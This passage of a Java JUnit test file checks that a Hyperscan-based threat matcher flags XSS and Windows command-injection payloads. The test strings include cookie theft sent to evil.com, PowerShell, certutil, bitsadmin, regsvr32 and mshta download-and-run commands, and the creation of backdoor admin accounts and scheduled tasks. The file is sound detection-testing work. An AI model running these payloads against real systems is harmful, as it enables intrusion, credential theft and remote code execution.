package com.akto.threat.detection.hyperscan;

import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.lang.reflect.Field;
import java.util.*;

import static org.junit.Assert.*;

/**
 * Tests that HyperscanThreatMatcher correctly detects real-world XSS and
 * Windows Command Injection payloads, verifying:
 *   1. The exact pattern prefix (e.g. xss_script_tag, windows_cmd_execution)
 *   2. The matched phrase overlaps the expected keyword
 *
 * Also includes comprehensive false-positive tests with realistic benign traffic.
 *
 * Payload sources: PayloadsAllTheThings, PortSwigger XSS cheat sheet, OWASP,
 * LOLBAS project, HackTricks, Atomic Red Team.
 *
 * Note: Hyperscan SOM_LEFTMOST may truncate the last 1-2 characters from
 * matchedText, so phrase checks use overlap (not exact contains).
 */
public class HyperscanPayloadDetectionTest {

    private static HyperscanThreatMatcher matcher;

    @BeforeClass
    public static void initMatcher() throws Exception {
        resetSingleton();
        matcher = HyperscanThreatMatcher.getInstance();
        boolean ok = matcher.initializeFromClasspath("threat-patterns-example.txt");
        assertTrue("Failed to initialize HyperscanThreatMatcher", ok);
        assertTrue("No patterns loaded", matcher.getPatternCount() > 0);
    }

    @AfterClass
    public static void cleanup() throws Exception {
        resetSingleton();
    }

    private static void resetSingleton() throws Exception {
        Field f = HyperscanThreatMatcher.class.getDeclaredField("INSTANCE");
        f.setAccessible(true);
        f.set(null, null);
    }

    // =====================================================================
    //  XSS — SCRIPT TAGS (1-12)
    //  Expected pattern: xss_script_tag or xss_script_data_src
    // =====================================================================

    @Test public void xss01_classicScript() { assertMatch("<script>alert('XSS')</script>", "body", "xss_script_tag", "<script"); }
    @Test public void xss02_scriptWithType() { assertMatch("<script type=\"text/javascript\">alert(1)</script>", "body", "xss_script_tag", "<script"); }
    @Test public void xss03_uppercaseScript() { assertMatch("<SCRIPT>alert(1)</SCRIPT>", "url", "xss_script_tag", "<script"); }
    @Test public void xss04_spacesInScript() { assertMatch("< script >alert(1)</ script >", "body", "xss_script_tag", "< script"); }
    @Test public void xss05_cookieTheft() { assertMatch("<script>document.location='http://evil.com/?c='+document.cookie</script>", "body", "xss_script_tag", "<script"); }
    @Test public void xss06_inUrlParam() { assertMatch("/search?q=<script>alert(1)</script>", "url", "xss_script_tag", "<script"); }
    @Test public void xss07_scriptFromCharCode() { assertMatch("<script>alert(String.fromCharCode(88,83,83))</script>", "body", "xss_script_tag", "<script"); }
    @Test public void xss08_mixedCaseScript() { assertMatch("<ScRiPt>alert(1)</ScRiPt>", "body", "xss_script_tag", "<script"); }
    @Test public void xss09_scriptSlashSrc() { assertMatch("<script/src=data:text/javascript,alert(1)>", "body", "xss_script_data_src", "<script"); }
    @Test public void xss10_scriptSrcDataQuoted() { assertMatch("<script src=\"data:text/javascript;base64,YWxlcnQoMSk=\">", "body", "xss_script_data_src", "<script"); }
    @Test public void xss11_scriptNested() { assertMatch("</script><script>alert(1)</script>", "body", "xss_script_tag", "<script"); }
    @Test public void xss12_scriptNoClose() { assertMatch("<script>alert(1)//", "body", "xss_script_tag", "<script"); }

    // =====================================================================
    //  XSS — EVENT HANDLERS with alert/prompt/confirm/eval (13-30)
    //  Expected pattern: xss_event_handler_alert
    // =====================================================================

    @Test public void xss13_imgOnerror() { assertMatch("<img src=x onerror=alert(1)>", "body", "xss_event_handler_alert", "onerror"); }
    @Test public void xss14_bodyOnload() { assertMatch("<body onload=alert('XSS')>", "body", "xss_event_handler_alert", "onload"); }
    @Test public void xss15_inputOnfocus() { assertMatch("<input onfocus=alert(document.cookie) autofocus>", "body", "xss_event_handler_alert", "onfocus"); }
    @Test public void xss16_divOnmouseover() { assertMatch("<div onmouseover=alert(document.domain)>hover</div>", "body", "xss_event_handler_alert", "onmouseover"); }
    @Test public void xss17_selectOnchange() { assertMatch("<select onchange=alert(1)><option>1</option></select>", "body", "xss_event_handler_alert", "onchange"); }
    @Test public void xss18_textareaOnkeyup() { assertMatch("<textarea onkeyup=eval('alert(1)')>type</textarea>", "body", "xss_event_handler_alert", "onkeyup"); }
    @Test public void xss19_imgOnloadValid() { assertMatch("<img src=valid.jpg onload=alert(1)>", "body", "xss_event_handler_alert", "onload"); }
    @Test public void xss20_onkeydownAlert() { assertMatch("<input onkeydown=alert(1)>", "body", "xss_event_handler_alert", "onkeydown"); }
    @Test public void xss21_onkeypressAlert() { assertMatch("<input onkeypress=alert(1)>", "body", "xss_event_handler_alert", "onkeypress"); }
    @Test public void xss22_onsubmitAlert() { assertMatch("<form onsubmit=alert(1)><input type=submit></form>", "body", "xss_event_handler_alert", "onsubmit"); }
    @Test public void xss23_onclickAlert() { assertMatch("<div onclick=alert(1)>click</div>", "body", "xss_event_handler_alert", "onclick"); }
    @Test public void xss24_onblurAlert() { assertMatch("<input onblur=alert(1) autofocus><input autofocus>", "body", "xss_event_handler_alert", "onblur"); }
    @Test public void xss25_onmousedownAlert() { assertMatch("<div onmousedown=alert(1)>click</div>", "body", "xss_event_handler_alert", "onmousedown"); }
    @Test public void xss26_onmouseupAlert() { assertMatch("<div onmouseup=alert(1)>click</div>", "body", "xss_event_handler_alert", "onmouseup"); }
    @Test public void xss27_onmouseenterAlert() { assertMatch("<div onmouseenter=alert(1)>hover</div>", "body", "xss_event_handler_alert", "onmouseenter"); }
    @Test public void xss28_onmouseleaveAlert() { assertMatch("<div onmouseleave=alert(1)>hover</div>", "body", "xss_event_handler_alert", "onmouseleave"); }
    @Test public void xss29_onfocusEval() { assertMatch("<input onfocus=eval('alert(1)') autofocus>", "body", "xss_event_handler_alert", "onfocus"); }
    @Test public void xss30_onerrorDocWrite() { assertMatch("<img src=x onerror=document.write('XSS')>", "body", "xss_event_handler_alert", "onerror"); }

    // =====================================================================
    //  XSS — SVG TAGS (31-38)
    // =====================================================================

    @Test public void xss31_svgOnload() { assertMatch("<svg onload=alert(1)>", "body", "xss_svg_event", "onload"); }
    @Test public void xss32_svgSlashOnload() { assertMatch("<svg/onload=prompt(1)//", "body", "xss_svg_event", "onload"); }
    @Test public void xss33_svgOnerror() { assertMatch("<svg onerror=alert(1)>", "url", "xss_svg_event", "onerror"); }
    @Test public void xss34_svgOnclick() { assertMatch("<svg onclick=alert(1)>", "body", "xss_svg_event", "onclick"); }
    @Test public void xss35_svgOnmouseover() { assertMatch("<svg onmouseover=alert(1)>click</svg>", "body", "xss_svg_event", "onmouseover"); }
    @Test public void xss36_svgScriptInside() { assertMatch("<svg><script>alert(1)</script></svg>", "body", "xss_script_tag", "script"); }
    @Test public void xss37_svgXlinkHref() { assertMatch("<svg><a xlink:href=\"javascript:alert(1)\"><text>click</text></a></svg>", "body", "xss_javascript_protocol", "javascript"); }
    @Test public void xss38_svgForeignObject() { assertMatch("<svg><foreignObject><body onload=alert(1)></foreignObject></svg>", "body", "xss_event_handler_alert", "onload"); }

    // =====================================================================
    //  XSS — IFRAME / EMBED / OBJECT / APPLET (39-48)
    // =====================================================================

    @Test public void xss39_iframeSrcJs() { assertMatch("<iframe src=\"javascript:alert(1)\">", "body", "xss_iframe_embed", "iframe"); }
    @Test public void xss40_iframeSrcData() { assertMatch("<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">", "body", "xss_iframe_embed", "iframe"); }
    @Test public void xss41_iframeSrcdoc() { assertMatch("<iframe srcdoc=\"<script>alert(1)</script>\">", "body", "xss_script_tag", "script"); }
    @Test public void xss42_embedSrcData() { assertMatch("<embed src=\"data:text/html,<script>alert(1)</script>\">", "body", "xss_iframe_embed", "embed"); }
    @Test public void xss43_objectDataJs() { assertMatch("<object data=\"javascript:alert(1)\">", "body", "xss_iframe_embed", "object"); }
    @Test public void xss44_objectDataBase64() { assertMatch("<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">", "body", "xss_iframe_embed", "object"); }
    @Test public void xss45_embedSrcJs() { assertMatch("<embed src=\"javascript:alert(1)\">", "body", "xss_iframe_embed", "embed"); }
    @Test public void xss46_appletCodeSrc() { assertMatch("<applet code=\"evil.class\" src=\"http://evil.com/evil.jar\">", "body", "xss_iframe_embed", "applet"); }
    @Test public void xss47_iframeDataHtml() { assertMatch("<iframe src=\"data:text/html,<script>alert(1)</script>\">", "body", "xss_iframe_embed", "iframe"); }
    @Test public void xss48_objectDataHtml() { assertMatch("<object data=\"data:text/html,<script>alert(1)</script>\">", "body", "xss_iframe_embed", "object"); }

    // =====================================================================
    //  XSS — JAVASCRIPT: PROTOCOL (49-58)
    // =====================================================================

    @Test public void xss49_hrefJs() { assertMatch("<a href=\"javascript:alert(1)\">click</a>", "body", "xss_javascript_protocol", "javascript"); }
    @Test public void xss50_hrefJsSpaces() { assertMatch("<a href=\"  javascript:alert(1)\">click</a>", "body", "xss_javascript_protocol", "javascript"); }
    @Test public void xss51_actionJs() { assertMatch("<form action=\"javascript:alert(1)\"><input type=submit>", "body", "xss_javascript_protocol", "javascript"); }
    @Test public void xss52_srcJs() { assertMatch("<iframe src=\"javascript:alert('XSS')\">", "body", "xss_javascript_protocol", "javascript"); }
    @Test public void xss53_hrefJsUppercase() { assertMatch("<a href=\"JAVASCRIPT:alert(1)\">click</a>", "body", "xss_javascript_protocol", "javascript"); }
    @Test public void xss54_hrefJsMixedCase() { assertMatch("<a href=\"jAvAsCrIpT:alert(1)\">click</a>", "body", "xss_javascript_protocol", "javascript"); }
    @Test public void xss55_hrefJsVoid() { assertMatch("<a href=\"javascript:void(document.location='http://evil.com/')\">x</a>", "body", "xss_javascript_protocol", "javascript"); }
    @Test public void xss56_formActionJs() { assertMatch("<form><button formaction=javascript:alert(1)>X</button>", "body", "xss_javascript_protocol", "javascript"); }
    // Entity-encoded javascript: — detected by xss_bare_alert (the alert() part is still readable)
    @Test public void xss57_hrefJsEntityEncoded() { assertMatch("<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">click</a>", "body", "xss_bare_alert", "alert"); }
    @Test public void xss58_hrefJsHexEntity() { assertMatch("<a href=\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\">click</a>", "body", "xss_bare_alert", "alert"); }

    // =====================================================================
    //  XSS — DATA:TEXT/HTML PROTOCOL (59-64)
    // =====================================================================

    @Test public void xss59_hrefDataHtml() { assertMatch("<a href=\"data:text/html,<script>alert(1)</script>\">click</a>", "body", "xss_data_html_protocol", "data:text/html"); }
    @Test public void xss60_srcDataHtmlBase64() { assertMatch("<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">", "body", "xss_data_html_protocol", "data:text/html"); }
    @Test public void xss61_linkDataHtml() { assertMatch("<link href=\"data:text/html,<script>alert(1)</script>\" rel=import>", "body", "xss_link_data_html", "data:text/html"); }
    @Test public void xss62_actionDataHtml() { assertMatch("<form action=\"data:text/html,<script>alert(1)</script>\">", "body", "xss_data_html_protocol", "data:text/html"); }
    @Test public void xss63_hrefDataHtmlEncoded() { assertMatch("<a href=\"data:text/html;charset=utf-8,<script>alert(1)</script>\">click</a>", "body", "xss_data_html_protocol", "data:text/html"); }
    @Test public void xss64_srcDataTextHtml() { assertMatch("<embed src=\"data:text/html,<script>alert(1)</script>\">", "body", "xss_data_html_protocol", "data:text/html"); }

    // =====================================================================
    //  XSS — STYLE / CSS BASED (65-72)
    // =====================================================================

    @Test public void xss65_styleUrlJs() { assertMatch("<div style=\"background:url(javascript:alert(1))\">", "body", "xss_style_javascript", "javascript"); }
    @Test public void xss66_styleExpression() { assertMatch("<div style=\"width:expression(alert(1))\">", "body", "xss_style_javascript", "expression"); }
    @Test public void xss67_styleVbscript() { assertMatch("<div style=\"background:url(vbscript:MsgBox)\">", "body", "xss_style_javascript", "vbscript"); }
    @Test public void xss68_styleTagExpression() { assertMatch("<style>*{x:expression(alert(1))}</style>", "body", "xss_style_tag_expression", "expression"); }
    @Test public void xss69_styleTagUrlJs() { assertMatch("<style>body{background:url(javascript:alert(1))}</style>", "body", "xss_style_tag_expression", "javascript"); }
    @Test public void xss70_styleColorExpression() { assertMatch("<div style=\"color:expression(alert(1))\">", "body", "xss_style_javascript", "expression"); }
    @Test public void xss71_xssTagStyleBehavior() { assertMatch("<div style=\"background:url(javascript:void(0));width:expression(alert(1))\">", "body", "xss_style_javascript", "expression"); }
    @Test public void xss72_styleImgExpression() { assertMatch("<img style=\"xss:expression(alert(1))\" src=x>", "body", "xss_style_javascript", "expression"); }

    // =====================================================================
    //  XSS — META REFRESH (73-76)
    // =====================================================================

    @Test public void xss73_metaRefresh() { assertMatch("<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">", "body", "xss_meta_refresh", "refresh"); }
    @Test public void xss74_metaRefreshUpper() { assertMatch("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;javascript:alert('XSS');\">", "body", "xss_meta_refresh", "refresh"); }
    @Test public void xss75_metaRefreshSingleQuote() { assertMatch("<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>", "body", "xss_meta_refresh", "refresh"); }
    @Test public void xss76_metaRefreshNoQuote() { assertMatch("<meta http-equiv=refresh content=0;url=javascript:alert(1)>", "body", "xss_meta_refresh", "refresh"); }

    // =====================================================================
    //  XSS — ENCODED / OBFUSCATED (77-88)
    // =====================================================================

    @Test public void xss77_hexEncodedScript() { assertMatch("&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", "body", "xss_encoded_tags", "&#x"); }
    @Test public void xss78_decimalScript() { assertMatch("&#60;script&#62;alert(1)&#60;/script&#62;", "body", "xss_encoded_tags", "&#"); }
    @Test public void xss79_hexIframe() { assertMatch("&#x3c;iframe src=javascript:alert(1)&#x3e;", "body", "xss_encoded_tags", "&#x"); }
    @Test public void xss80_imgOnerrorDocCookie() { assertMatch("<img src=x onerror=alert(document.cookie)>", "body", "xss_event_handler_alert", "onerror"); }
    @Test public void xss81_inputOnfocusAlert() { assertMatch("<input onfocus=alert(1) autofocus>", "body", "xss_event_handler_alert", "onfocus"); }
    @Test public void xss82_bodyOnloadAlert() { assertMatch("<body onload=alert('XSS')>", "body", "xss_event_handler_alert", "onload"); }
    @Test public void xss83_base64Atob() { assertMatch("<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">", "body", "xss_event_handler_alert", "onerror"); }
    @Test public void xss84_fromCharCodeEval() { assertMatch("<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">", "body", "xss_event_handler_alert", "onerror"); }
    @Test public void xss85_selectOnfocusAlert() { assertMatch("<select onfocus=alert(1)></select>", "body", "xss_event_handler_alert", "onfocus"); }
    // [].constructor.constructor(...) doesn't match event_handler_alert (not a recognized function), falls to bare_alert
    @Test public void xss86_functionConstructor() { assertMatch("<img src=x onerror=\"[].constructor.constructor('alert(1)')()\">", "body", "xss_bare_alert", "alert"); }
    @Test public void xss87_marqueeOnstart() { assertMatch("<marquee onstart=alert(1)>", "body", "xss_bare_alert", "alert"); }
    @Test public void xss88_detailsOntoggle() { assertMatch("<details ontoggle=alert(1) open>", "body", "xss_bare_alert", "alert"); }

    // =====================================================================
    //  XSS — BARE ALERT / STRING CONTEXT (89-96)
    // =====================================================================

    @Test public void xss89_stringBreakAlert() { assertMatch("\";alert(1);//", "body", "xss_bare_alert", "alert"); }
    @Test public void xss90_equalsAlert() { assertMatch("x='-alert(1)-'", "body", "xss_bare_alert", "alert"); }
    @Test public void xss91_equalsPrompt() { assertMatch("=prompt(document.domain)", "body", "xss_bare_alert", "prompt"); }
    @Test public void xss92_semicolonConfirm() { assertMatch("\";confirm('XSS');//", "body", "xss_bare_alert", "confirm"); }
    @Test public void xss93_commaAlert() { assertMatch(",alert(1),", "body", "xss_bare_alert", "alert"); }
    @Test public void xss94_parenAlert() { assertMatch("(alert(1))", "body", "xss_bare_alert", "alert"); }
    @Test public void xss95_spaceAlertUrl() { assertMatch(" alert(1)", "url", "xss_bare_alert", "alert"); }
    @Test public void xss96_semicolonAlertBody() { assertMatch(";alert(1);", "body", "xss_bare_alert", "alert"); }

    // =====================================================================
    //  XSS — UNUSUAL TAGS/ATTRIBUTES (97-106)
    // =====================================================================

    @Test public void xss97_imageTag() { assertMatch("<image src=x onerror=alert(1)>", "body", "xss_event_handler_alert", "onerror"); }
    @Test public void xss98_videoOnerror() { assertMatch("<video src=x onerror=alert(1)>", "body", "xss_event_handler_alert", "onerror"); }
    @Test public void xss99_audioOnerror() { assertMatch("<audio src=x onerror=alert(1)>", "body", "xss_event_handler_alert", "onerror"); }
    @Test public void xss100_mathMtextImg() { assertMatch("<math><mtext><img src=x onerror=alert(1)></mtext></math>", "body", "xss_event_handler_alert", "onerror"); }
    @Test public void xss101_imgSlashDelim() { assertMatch("<img/src=x/onerror=alert(1)>", "body", "xss_event_handler_alert", "onerror"); }
    @Test public void xss102_imgNoClose() { assertMatch("<img src=x onerror=alert(1)//", "body", "xss_event_handler_alert", "onerror"); }
    @Test public void xss103_imgDoubleQuoteBreak() { assertMatch("<img \"\"\"><script>alert(1)</script>\">", "body", "xss_script_tag", "script"); }
    @Test public void xss104_polyglotMultiCtx() { assertMatch("\" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//", "body", "xss_event_handler_alert", "onclick"); }
    @Test public void xss105_breakoutSvg() { assertMatch("</script><svg onload=alert(1)>", "body", "xss_svg_event", "onload"); }
    @Test public void xss106_isindexAction() { assertMatch("<isindex action=javascript:alert(1)>", "body", "xss_javascript_protocol", "javascript"); }

    // =====================================================================
    //  WINDOWS CMD INJECTION — CMD.EXE (107-120)
    //  Expected pattern: windows_cmd_execution
    // =====================================================================

    @Test public void win01_cmdDir() { assertMatch("| cmd /c dir", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win02_cmdExeWhoami() { assertMatch("& cmd.exe /c whoami", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win03_cmdTypeHosts() { assertMatch("; cmd /c type C:\\windows\\system32\\drivers\\etc\\hosts", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win04_cmdEcho() { assertMatch("& cmd /c echo %USERNAME%", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win05_cmdKSet() { assertMatch("| cmd /k set", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win06_cmdDirRecursive() { assertMatch("| cmd /c dir /s /b C:\\Users", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win07_cmdCopy() { assertMatch("| cmd /c copy C:\\Windows\\win.ini C:\\Temp\\exfil.txt", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win08_cmdDel() { assertMatch("| cmd /c del /f /q C:\\Temp\\target.txt", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win09_cmdMkdir() { assertMatch("| cmd /c mkdir C:\\Temp\\staging", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win10_cmdVer() { assertMatch("| cmd /c ver", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win11_cmdSysteminfo() { assertMatch("| cmd /k systeminfo", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win12_cmdHostname() { assertMatch("| cmd /c hostname", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win13_cmdNetstat() { assertMatch("| cmd /c netstat -ano", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win14_cmdFindstr() { assertMatch("| cmd /c findstr /si password *.txt *.xml", "body", "windows_cmd_execution", "cmd"); }

    // =====================================================================
    //  WINDOWS CMD INJECTION — WSCRIPT / CSCRIPT (121-126)
    // =====================================================================

    @Test public void win15_wscript() { assertMatch("| wscript C:\\temp\\payload.vbs", "body", "windows_cmd_execution", "wscript"); }
    @Test public void win16_cscriptNologo() { assertMatch("| cscript //nologo C:\\temp\\payload.js", "body", "windows_cmd_execution", "cscript"); }
    @Test public void win17_cscriptJscript() { assertMatch("& cscript /e:jscript C:\\temp\\evil.txt", "body", "windows_cmd_execution", "cscript"); }
    @Test public void win18_wscriptExe() { assertMatch("| wscript.exe C:\\temp\\payload.vbs", "body", "windows_cmd_execution", "wscript"); }
    @Test public void win19_cscriptExe() { assertMatch("& cscript.exe //nologo C:\\temp\\payload.js", "body", "windows_cmd_execution", "cscript"); }
    @Test public void win20_cmdStartWscript() { assertMatch("& cmd /c start /b wscript C:\\temp\\p.vbs", "body", "windows_cmd_execution", "cmd"); }

    // =====================================================================
    //  WINDOWS CMD INJECTION — POWERSHELL (127-142)
    // =====================================================================

    @Test public void win21_psCommand() { assertMatchAnyPrefix("| powershell -Command Get-Process", "body", new String[]{"windows_powershell_syntax", "windows_cmd_execution"}, "powershell"); }
    @Test public void win22_psEncodedCommand() { assertMatch("& powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdA==", "body", "windows_powershell_syntax", "powershell"); }
    @Test public void win23_psEnc() { assertMatch("| powershell -Enc SQBFAFgA", "body", "windows_powershell_syntax", "powershell"); }
    @Test public void win24_psE() { assertMatch("& powershell -E JABjAD0ATgBlAHcA", "body", "windows_powershell_syntax", "powershell"); }
    @Test public void win25_psFile() { assertMatch("| powershell -File C:\\temp\\payload.ps1", "body", "windows_powershell_syntax", "powershell"); }
    @Test public void win26_psExecPolicyBypass() { assertMatch("& powershell -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')", "body", "windows_powershell_syntax", "powershell"); }
    @Test public void win27_pwshCommand() { assertMatchAnyPrefix("| pwsh -Command whoami", "body", new String[]{"windows_powershell_syntax", "windows_cmd_execution"}, "pwsh"); }
    @Test public void win28_psHiddenWindow() { assertMatch("| powershell -WindowStyle Hidden -Command Get-Process", "body", "windows_powershell_syntax", "powershell"); }
    @Test public void win29_psDownloadFile() { assertMatch("powershell -Command (New-Object Net.WebClient).DownloadFile('http://evil.com/mal.exe','C:\\Temp\\mal.exe')", "body", "windows_powershell_syntax", "powershell"); }
    @Test public void win30_psIEX() { assertMatch("powershell -Command IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')", "body", "windows_powershell_syntax", "powershell"); }
    @Test public void win31_psBase64Decode() { assertMatch("powershell -Command [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hvYW1p'))|IEX", "body", "windows_powershell_syntax", "powershell"); }
    @Test public void win32_psInvokeExpression() { assertMatch("powershell -Command Invoke-Expression (Get-Content C:\\Temp\\script.ps1 -Raw)", "body", "windows_powershell_syntax", "powershell"); }
    @Test public void win33_psExeEnc() { assertMatch("powershell.exe -Enc SQBFAFgA", "body", "windows_powershell_syntax", "powershell"); }
    @Test public void win34_pwshExeFile() { assertMatch("pwsh.exe -File C:\\temp\\test.ps1", "body", "windows_powershell_syntax", "pwsh"); }
    @Test public void win35_psIWR() { assertMatch("powershell -Command iex(iwr http://evil.com/p -UseBasicParsing)", "body", "windows_powershell_syntax", "powershell"); }
    @Test public void win36_psScriptBlock() { assertMatch("powershell -Command & {whoami}", "body", "windows_powershell_syntax", "powershell"); }

    // =====================================================================
    //  WINDOWS CMD INJECTION — SYSTEM COMMANDS / LOLBAS (143-170)
    //  Expected pattern: windows_system_commands
    // =====================================================================

    @Test public void win37_certutilDownload() { assertMatch("certutil -urlcache -split -f http://evil.com/shell.exe C:\\temp\\shell.exe", "body", "windows_system_commands", "certutil"); }
    @Test public void win38_certutilEncode() { assertMatch("certutil -encode C:\\Temp\\payload.exe C:\\Temp\\encoded.b64", "body", "windows_system_commands", "certutil"); }
    @Test public void win39_certutilDecode() { assertMatch("certutil -decode C:\\Temp\\encoded.b64 C:\\Temp\\decoded.exe", "body", "windows_system_commands", "certutil"); }
    @Test public void win40_certutilHash() { assertMatch("certutil -hashfile C:\\Windows\\notepad.exe SHA256", "body", "windows_system_commands", "certutil"); }
    @Test public void win41_bitsadminTransfer() { assertMatch("bitsadmin /transfer myJob http://evil.com/payload.exe C:\\temp\\payload.exe", "body", "windows_system_commands", "bitsadmin"); }
    @Test public void win42_bitsadminRaw() { assertMatch("bitsadmin /rawreturn /transfer getfile http://evil.com/test.txt C:\\Temp\\test.txt", "body", "windows_system_commands", "bitsadmin"); }
    @Test public void win43_rundll32Js() { assertMatch("rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write()", "body", "windows_system_commands", "rundll32"); }
    @Test public void win44_rundll32Shell() { assertMatch("rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe /c whoami", "body", "windows_system_commands", "rundll32"); }
    @Test public void win45_rundll32Url() { assertMatch("rundll32.exe url.dll,OpenURL http://evil.com/payload.hta", "body", "windows_system_commands", "rundll32"); }
    @Test public void win46_regsvr32Squiblydoo() { assertMatch("regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll", "body", "windows_system_commands", "regsvr32"); }
    @Test public void win47_regsvr32Unc() { assertMatch("regsvr32 /s /n /u /i:\\\\evil\\share\\file.sct scrobj.dll", "body", "windows_system_commands", "regsvr32"); }
    @Test public void win48_wmicProcessCreate() { assertMatch("wmic process call create \"cmd.exe /c whoami\"", "body", "windows_system_commands", "wmic"); }
    @Test public void win49_wmicProcessList() { assertMatch("wmic process list brief", "body", "windows_system_commands", "wmic"); }
    @Test public void win50_wmicOsGet() { assertMatch("wmic os get Caption,Version,BuildNumber", "body", "windows_system_commands", "wmic"); }
    @Test public void win51_wmicUseraccount() { assertMatch("wmic useraccount list brief", "body", "windows_system_commands", "wmic"); }
    @Test public void win52_wmicService() { assertMatch("wmic service where \"state='running'\" get Name,PathName", "body", "windows_system_commands", "wmic"); }
    @Test public void win53_wmicStartup() { assertMatch("wmic startup list full", "body", "windows_system_commands", "wmic"); }
    @Test public void win54_wmicRemote() { assertMatch("wmic /node:192.168.1.2 process call create \"cmd.exe /c whoami\"", "body", "windows_system_commands", "wmic"); }
    @Test public void win55_mshtaVbscript() { assertMatch("mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run\")", "body", "windows_system_commands", "mshta"); }
    @Test public void win56_mshtaJs() { assertMatch("mshta javascript:a=GetObject(\"script:http://evil.com/test.sct\").Exec()", "body", "windows_system_commands", "mshta"); }
    @Test public void win57_mshtaRemoteHta() { assertMatch("mshta http://evil.com/payload.hta", "body", "windows_system_commands", "mshta"); }
    @Test public void win58_schtasksCreate() { assertMatch("schtasks /create /tn backdoor /tr C:\\temp\\shell.exe /sc minute", "body", "windows_system_commands", "schtasks"); }
    @Test public void win59_schtasksQuery() { assertMatch("schtasks /query /fo LIST /v", "body", "windows_system_commands", "schtasks"); }
    @Test public void win60_schtasksRun() { assertMatch("schtasks /run /tn Updater", "body", "windows_system_commands", "schtasks"); }
    @Test public void win61_schtasksDelete() { assertMatch("schtasks /delete /tn Updater /f", "body", "windows_system_commands", "schtasks"); }
    @Test public void win62_tasklistVerbose() { assertMatch("tasklist /v /fi \"STATUS eq running\"", "body", "windows_system_commands", "tasklist"); }
    @Test public void win63_nslookup() { assertMatch("nslookup evil.com", "body", "windows_system_commands", "nslookup"); }
    @Test public void win64_nslookupMx() { assertMatch("nslookup -type=mx example.com 8.8.8.8", "body", "windows_system_commands", "nslookup"); }
    @Test public void win65_ipconfig() { assertMatch("ipconfig /all", "body", "windows_system_commands", "ipconfig"); }
    @Test public void win66_whoami() { assertMatch("whoami /priv", "body", "windows_whoami", "whoami"); }

    // =====================================================================
    //  WINDOWS CMD INJECTION — NET COMMANDS (171-182)
    //  Expected pattern: windows_net_commands
    // =====================================================================

    @Test public void win67_netUser() { assertMatch("net user administrator", "body", "windows_net_commands", "net"); }
    @Test public void win68_netUserAdd() { assertMatch("net user hacker P@ss /add", "body", "windows_net_commands", "net"); }
    @Test public void win69_netLocalgroup() { assertMatch("net localgroup administrators", "body", "windows_net_commands", "net"); }
    @Test public void win70_netLocalgroupAdd() { assertMatch("net localgroup administrators hacker /add", "body", "windows_net_commands", "net"); }
    @Test public void win71_netUse() { assertMatch("net use \\\\attacker\\share", "body", "windows_net_commands", "net"); }
    @Test public void win72_netView() { assertMatch("net view /domain", "body", "windows_net_commands", "net"); }
    @Test public void win73_netSession() { assertMatch("net session", "body", "windows_net_commands", "net"); }
    @Test public void win74_netShare() { assertMatch("net share", "body", "windows_net_commands", "net"); }
    @Test public void win75_netStart() { assertMatch("net start", "body", "windows_net_commands", "net"); }
    @Test public void win76_netStop() { assertMatch("net stop Spooler", "body", "windows_net_commands", "net"); }
    @Test public void win77_netAccounts() { assertMatch("net accounts", "body", "windows_net_commands", "net"); }
    @Test public void win78_netConfig() { assertMatch("net config workstation", "body", "windows_net_commands", "net"); }

    // =====================================================================
    //  WINDOWS CMD INJECTION — PING (183-188)
    //  Expected pattern: windows_ping
    // =====================================================================

    @Test public void win79_pingLoopback() { assertMatch("ping 127.0.0.1", "body", "windows_ping", "ping"); }
    @Test public void win80_pingCount() { assertMatch("ping -n 10 127.0.0.1", "body", "windows_ping", "ping"); }
    @Test public void win81_pingDomain() { assertMatch("ping evil.com", "body", "windows_ping", "ping"); }
    @Test public void win82_pingExe() { assertMatch("ping.exe 192.168.1.1", "body", "windows_ping", "ping"); }
    @Test public void win83_pingLargePacket() { assertMatch("ping -l 65500 192.168.1.1", "body", "windows_ping", "ping"); }
    @Test public void win84_pingTtl() { assertMatch("ping -i 255 10.0.0.1", "body", "windows_ping", "ping"); }

    // =====================================================================
    //  WINDOWS CMD INJECTION — ENV VAR & EVASION (189-196)
    // =====================================================================

    @Test public void win85_comspec() { assertMatch("| cmd /c echo %COMSPEC%", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win86_cmdPipeWhoami() { assertMatch("| whoami", "body", "os_cmd_shell_commands", "whoam"); }
    @Test public void win87_cmdOrWhoami() { assertMatch("|| whoami", "body", "os_cmd_shell_commands", "whoam"); }
